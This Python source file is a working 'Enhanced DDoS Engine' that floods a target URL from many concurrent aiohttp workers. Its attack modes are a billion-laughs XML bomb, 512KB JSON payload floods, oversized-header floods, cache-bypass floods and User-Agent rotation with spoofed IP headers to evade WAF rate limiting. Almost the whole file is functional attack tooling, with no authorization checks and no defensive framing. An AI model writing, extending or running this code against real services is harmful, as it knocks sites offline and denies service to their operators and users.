#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Enhanced DDoS Engine - Advanced Attack Vectors
- HTTP Flood (GET/POST) - existing
- Slowloris - existing
- XML Bomb (Billion Laughs) - NEW
- Large Payload Flood - NEW
- HTTP Header Overflow - NEW
- Concurrent Connection Exhaust - NEW
- Randomized User-Agent + IP Spoof Headers Flood - NEW
- Cache Bypass Flood - NEW
"""

import asyncio
import aiohttp
import random
import string
import time
import threading
from typing import Optional, Callable, Dict

# ── Shared stats ──────────────────────────────────────────────────────────────
_stats = {
    "sent": 0, "success": 0, "errors": 0,
    "rps": 0.0, "elapsed": 0, "blocked": 0,
}
_stats_lock = threading.Lock()


def _reset_stats():
    global _stats
    with _stats_lock:
        _stats = {"sent": 0, "success": 0, "errors": 0, "rps": 0.0, "elapsed": 0, "blocked": 0}


def get_stats() -> dict:
    with _stats_lock:
        return dict(_stats)


def _inc(key, n=1):
    with _stats_lock:
        _stats[key] = _stats.get(key, 0) + n


# ── Payload Generators ────────────────────────────────────────────────────────

# XML Bomb — exponential entity expansion
XML_BOMB = b"""<?xml version="1.0"?>
<!DOCTYPE bomb [
  <!ENTITY a "AAAAAAAAAA">
  <!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;">
  <!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;">
  <!ENTITY d "&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;">
  <!ENTITY e "&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;">
]>
<root>&e;&e;&e;&e;&e;&e;&e;&e;&e;&e;</root>"""

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15",
    "Googlebot/2.1 (+http://www.google.com/bot.html)",
    "python-requests/2.32.3",
    "curl/8.4.0",
    "PostmanRuntime/7.36.0",
]

FAKE_IPS = [
    f"10.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
    for _ in range(200)
]

CACHE_BYPASS_PARAMS = ["nocache", "bust", "v", "cb", "ts", "_", "rand"]

def random_str(n=16):
    return "".join(random.choices(string.ascii_letters + string.digits, k=n))

def random_headers():
    return {
        "User-Agent": random.choice(USER_AGENTS),
        "X-Forwarded-For": random.choice(FAKE_IPS),
        "X-Real-IP": random.choice(FAKE_IPS),
        "X-Originating-IP": random.choice(FAKE_IPS),
        "Referer": f"https://www.google.com/search?q={random_str(8)}",
        "Accept-Language": random.choice(["en-US,en;q=0.9", "vi-VN,vi;q=0.8", "zh-CN,zh;q=0.9"]),
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": random.choice(["keep-alive", "close"]),
    }

def large_json_payload(size_kb=256):
    """Generate a large JSON payload."""
    data = {
        "id": random_str(8),
        "name": random_str(64),
        "data": "A" * (size_kb * 1024),
        "timestamp": time.time(),
        "nested": {k: random_str(32) for k in range(50)},
    }
    import json
    return json.dumps(data).encode()

def overflow_headers():
    """Generate HTTP headers designed to overflow buffers."""
    hdrs = random_headers()
    hdrs["X-Custom-Header"] = "A" * 8000  # 8KB header
    hdrs["Cookie"] = "; ".join(f"{random_str(8)}={random_str(64)}" for _ in range(50))
    return hdrs


# ── Attack Engines ────────────────────────────────────────────────────────────

async def _xml_bomb_worker(url: str, session: aiohttp.ClientSession, stop_event: asyncio.Event):
    """Send XML Bomb payloads."""
    while not stop_event.is_set():
        try:
            async with session.post(
                url,
                data=XML_BOMB,
                headers={
                    **random_headers(),
                    "Content-Type": "application/xml",
                },
            ) as resp:
                _inc("sent")
                if resp.status in (200, 201, 204):
                    _inc("success")
                elif resp.status in (403, 429):
                    _inc("blocked")
                else:
                    _inc("success")  # Still counts as sent
        except Exception:
            _inc("errors")


async def _large_payload_worker(url: str, session: aiohttp.ClientSession,
                                stop_event: asyncio.Event, payload_kb: int = 512):
    """Send large payload POST requests."""
    payload = large_json_payload(payload_kb)
    while not stop_event.is_set():
        try:
            async with session.post(
                url,
                data=payload,
                headers={**random_headers(), "Content-Type": "application/json"},
            ) as resp:
                _inc("sent")
                if resp.status < 400:
                    _inc("success")
                elif resp.status in (403, 429, 413):
                    _inc("blocked")
                else:
                    _inc("errors")
        except Exception:
            _inc("errors")


async def _header_overflow_worker(url: str, session: aiohttp.ClientSession,
                                  stop_event: asyncio.Event):
    """Send HTTP requests with massive headers to overflow buffers."""
    while not stop_event.is_set():
        try:
            async with session.get(url, headers=overflow_headers()) as resp:
                _inc("sent")
                if resp.status < 400:
                    _inc("success")
                else:
                    _inc("errors")
        except Exception:
            _inc("errors")


async def _cache_bypass_worker(url: str, session: aiohttp.ClientSession,
                               stop_event: asyncio.Event):
    """Bypass CDN/proxy cache by randomizing request parameters."""
    while not stop_event.is_set():
        try:
            param = random.choice(CACHE_BYPASS_PARAMS)
            bypass_url = f"{url}?{param}={random_str(12)}&_t={int(time.time()*1000)}"
            async with session.get(bypass_url, headers=random_headers()) as resp:
                _inc("sent")
                if resp.status < 400:
                    _inc("success")
                else:
                    _inc("errors")
        except Exception:
            _inc("errors")


async def _ua_rotation_flood_worker(url: str, session: aiohttp.ClientSession,
                                    stop_event: asyncio.Event):
    """Flood with rotating User-Agents and fake IPs to evade WAF rate limiting."""
    paths = ["/", "/api/health", "/search", "/api", "/products", "/login"]
    while not stop_event.is_set():
        try:
            path = random.choice(paths)
            target = url.rstrip("/") + path
            async with session.get(target, headers=random_headers()) as resp:
                _inc("sent")
                if resp.status < 400:
                    _inc("success")
                elif resp.status in (403, 429):
                    _inc("blocked")
                else:
                    _inc("errors")
        except Exception:
            _inc("errors")


async def _run_enhanced_ddos(
    url: str,
    attack_type: str,
    workers: int,
    duration: int,
    stats_callback: Optional[Callable] = None,
):
    """Main async runner for enhanced DDoS attacks."""
    _reset_stats()

    connector = aiohttp.TCPConnector(
        limit=workers + 200,   # headroom cho 2000+ workers
        limit_per_host=0,      # không giới hạn per-host
        force_close=False,
        enable_cleanup_closed=True,
        ssl=False,
    )
    timeout = aiohttp.ClientTimeout(total=15, connect=5)
    stop_event = asyncio.Event()

    # Map attack type to worker
    worker_map = {
        "xml_bomb":       _xml_bomb_worker,
        "large_payload":  _large_payload_worker,
        "header_overflow": _header_overflow_worker,
        "cache_bypass":   _cache_bypass_worker,
        "ua_flood":       _ua_rotation_flood_worker,
    }
    worker_fn = worker_map.get(attack_type, _ua_rotation_flood_worker)

    # Payload size for large_payload mode
    kwargs = {}
    if attack_type == "large_payload":
        kwargs["payload_kb"] = 512

    async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
        # Launch workers
        tasks = [
            asyncio.create_task(worker_fn(url, session, stop_event, **kwargs))
            for _ in range(workers)
        ]

        # Stats updater
        start_time = time.time()
        prev_sent = 0
        while time.time() - start_time < duration:
            await asyncio.sleep(0.5)
            elapsed = round(time.time() - start_time, 1)
            with _stats_lock:
                cur_sent = _stats["sent"]
                rps = round((cur_sent - prev_sent) * 2, 1)  # per 0.5s * 2
                _stats["rps"] = rps
                _stats["elapsed"] = elapsed
                prev_sent = cur_sent

            if stats_callback:
                stats_callback(get_stats())

        # Stop all workers
        stop_event.set()
        for t in tasks:
            t.cancel()
        await asyncio.gather(*tasks, return_exceptions=True)


class EnhancedDDoSEngine:
    """Thread-safe wrapper for running enhanced DDoS attacks."""

    ATTACK_TYPES = {
        "xml_bomb": {
            "name": "XML Bomb",
            "description": "Sends XML payloads with exponential entity expansion to exhaust XML parser memory/CPU",
            "icon": "💣",
        },
        "large_payload": {
            "name": "Large Payload Flood",
            "description": "Sends large JSON/binary POST bodies (512KB each) to exhaust server memory and bandwidth",
            "icon": "📦",
        },
        "header_overflow": {
            "name": "HTTP Header Overflow",
            "description": "Sends requests with 8KB+ headers and 50 cookies to overflow buffers and exhaust request parsing",
            "icon": "📨",
        },
        "cache_bypass": {
            "name": "Cache Bypass Flood",
            "description": "Randomizes request parameters to bypass CDN/proxy cache, forcing origin server to handle every request",
            "icon": "🔄",
        },
        "ua_flood": {
            "name": "UA Rotation Flood",
            "description": "Rotates User-Agents and spoofs IPs to evade WAF rate-limiting rules",
            "icon": "🎭",
        },
    }

    def __init__(self):
        self._thread: Optional[threading.Thread] = None
        self._loop: Optional[asyncio.AbstractEventLoop] = None
        self.is_running = False

    def start(
        self,
        url: str,
        attack_type: str,
        workers: int = 100,
        duration: int = 30,
        stats_callback: Optional[Callable] = None,
    ) -> bool:
        if self.is_running:
            return False

        def _run():
            self._loop = asyncio.new_event_loop()
            asyncio.set_event_loop(self._loop)
            try:
                self._loop.run_until_complete(
                    _run_enhanced_ddos(url, attack_type, workers, duration, stats_callback)
                )
            finally:
                self._loop.close()
                self.is_running = False

        self._thread = threading.Thread(target=_run, daemon=True)
        self.is_running = True
        self._thread.start()
        return True

    def stop(self) -> dict:
        if self._loop and not self._loop.is_closed():
            try:
                self._loop.stop()
            except Exception:
                pass
        self.is_running = False
        return get_stats()

    def get_stats(self) -> dict:
        stats = get_stats()
        stats["running"] = self.is_running
        return stats


# Singleton
_enhanced_engine: Optional[EnhancedDDoSEngine] = None

def get_enhanced_engine() -> EnhancedDDoSEngine:
    global _enhanced_engine
    if _enhanced_engine is None:
        _enhanced_engine = EnhancedDDoSEngine()
    return _enhanced_engine
